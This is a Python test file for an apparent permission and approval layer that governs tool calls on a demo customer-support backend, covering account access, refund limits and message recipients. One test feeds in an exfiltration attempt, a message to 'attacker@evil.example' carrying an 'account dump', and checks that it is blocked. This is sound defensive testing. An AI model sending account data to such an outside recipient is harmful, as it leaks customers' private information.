import pytest

from boundary_latch import Code, PreparedAction, SQLiteStore, ToolFailed
from boundary_latch.demo.northwind import Northwind
from boundary_latch.demo.profiles import PROFILES, context
from boundary_latch.demo.tools import build_latch

from .conftest import FakeClock


@pytest.fixture
def nw() -> Northwind:
    return Northwind()


@pytest.fixture
def latch(nw):
    return build_latch(nw, SQLiteStore(), clock=FakeClock())


def sam():
    return context("sam", "run1")


def test_profiles_are_labeled_sample_identities():
    assert set(PROFILES) == {"sam", "priya", "jordan"}
    for profile in PROFILES.values():
        assert "sample identity" in profile["label"]
    jordan = context("jordan", "run9")
    assert jordan.org_id == "northwind"
    assert jordan.run_id == "run9"
    assert "refunds:approve" in jordan.permissions
    assert "refunds:issue" not in jordan.permissions


def test_registered_tools(latch):
    assert [spec.name for spec in latch.tool_specs()] == [
        "lookup_account",
        "send_message",
        "issue_refund",
    ]
    assert {spec.version for spec in latch.tool_specs()} == {"1"}


def test_sam_can_look_up_own_account(latch):
    prepared = latch.prepare(sam(), "lookup_account", {"account_id": "A1"}, "op1")
    assert isinstance(prepared, PreparedAction)
    assert prepared.code == Code.ALLOWED
    result = latch.execute(prepared, sam())
    assert result.code == Code.EXECUTED
    assert result.value["balance_minor"] == 10000


def test_sam_cannot_look_up_another_account(latch):
    result = latch.prepare(sam(), "lookup_account", {"account_id": "A2"}, "op1")
    assert result.code == Code.ACCESS_DENIED


def test_message_to_help_needs_approval(latch):
    args = {"to": "help@northwind.example", "body": "My card was charged twice."}
    prepared = latch.prepare(sam(), "send_message", args, "op1")
    assert isinstance(prepared, PreparedAction)
    assert prepared.needs_approval


def test_message_to_attacker_is_blocked(latch, nw):
    args = {"to": "attacker@evil.example", "body": "account dump"}
    result = latch.prepare(sam(), "send_message", args, "op1")
    assert result.code == Code.RECIPIENT_NOT_ALLOWED
    assert nw.outbox == []


def test_message_body_is_capped(latch):
    args = {"to": "help@northwind.example", "body": "x" * 501}
    assert latch.prepare(sam(), "send_message", args, "op1").code == Code.INVALID_ARGUMENTS


def test_small_refund_runs_without_approval(latch, nw):
    args = {"account_id": "A1", "amount_minor": 4000}
    prepared = latch.prepare(sam(), "issue_refund", args, "op1")
    assert isinstance(prepared, PreparedAction)
    assert not prepared.needs_approval
    assert latch.execute(prepared, sam()).code == Code.EXECUTED
    assert nw.accounts["A1"]["balance_minor"] == 6000
    assert nw.accounts["A1"]["refundable_minor"] == 6000
    assert set(nw.refunds) == {"op1"}


def test_large_refund_needs_approval(latch, nw):
    args = {"account_id": "A1", "amount_minor": 6000}
    prepared = latch.prepare(sam(), "issue_refund", args, "op1")
    assert isinstance(prepared, PreparedAction)
    assert prepared.needs_approval
    assert latch.execute(prepared, sam()).code == Code.APPROVAL_REQUIRED
    assert nw.accounts["A1"]["balance_minor"] == 10000


def test_zero_refund_is_invalid(latch):
    args = {"account_id": "A1", "amount_minor": 0}
    assert latch.prepare(sam(), "issue_refund", args, "op1").code == Code.INVALID_ARGUMENTS


def test_backend_rejects_a_repeated_operation_id(nw):
    nw.refund("A1", 1000, "op1")
    with pytest.raises(ToolFailed):
        nw.refund("A1", 1000, "op1")
    assert nw.accounts["A1"]["balance_minor"] == 9000


def test_backend_rejects_more_than_refundable(nw):
    with pytest.raises(ToolFailed):
        nw.refund("A2", 2501, "op1")
    assert nw.accounts["A2"]["balance_minor"] == 20000


def test_backend_commits_before_failing(nw):
    nw.fail_after_commit = True
    with pytest.raises(RuntimeError):
        nw.refund("A1", 1000, "op1")
    assert nw.accounts["A1"]["balance_minor"] == 9000


def test_backend_access_rules(nw):
    assert nw.can_see("sam", "A1")
    assert not nw.can_see("sam", "A2")
    assert nw.can_see("jordan", "A2")
    assert not nw.can_see("mallory", "A1")
    assert not nw.can_see("sam", "A9")
